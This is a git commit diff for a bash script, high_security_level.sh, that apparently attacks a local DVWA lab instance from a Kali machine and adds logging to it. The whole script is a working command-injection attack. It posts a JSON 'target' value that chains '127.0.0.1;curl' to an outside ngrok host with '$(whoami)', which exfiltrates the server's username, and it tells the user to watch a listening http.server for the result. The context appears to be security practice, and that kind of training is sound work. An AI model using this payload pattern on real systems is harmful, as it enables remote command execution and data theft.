384587a40a969bbffd3b76227d652ddc06d32a28
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-05-12 15:46:38 +0200

    Enhance logging and feedback in high_security_level.sh
    Refactor script to log request status and provide feedback.

--- high_security_level.sh
+++ high_security_level.sh
@@ -1,7 +1,14 @@
 #!/bin/bash
 
-curl -X POST \
-http://192.168.56.105/DVWA/vulnerabilities/api/v2/health/connectivity \
--H "Content-Type: application/json" \
--d '{ "target":"127.0.0.1;curl https://multichanneled-alkalimetrically-rayford.ngrok-free.dev?cmd=$(whoami)" }' \
-> /home/kali/api_high.log
+{
+echo "Attempting to send system-level username to server..."
+echo "---------------------------------------------------"
+RESPONSE=$(curl -X POST \
+  -H "Content-Type: application/json" \
+  -d '{ "target":"127.0.0.1;curl https://multichanneled-alkalimetrically-rayford.ngrok-free.dev?cmd=$(whoami)" }' \
+  http://192.168.56.105/DVWA/vulnerabilities/api/v2/health/connectivity)
+STATUS=$(echo "$RESPONSE" | jq -r '.status')
+echo "Request status: $STATUS"
+echo ""
+echo "Check terminal where you pasted python -m http.server 8000 to get the username"
+}> /home/kali/api_high.log
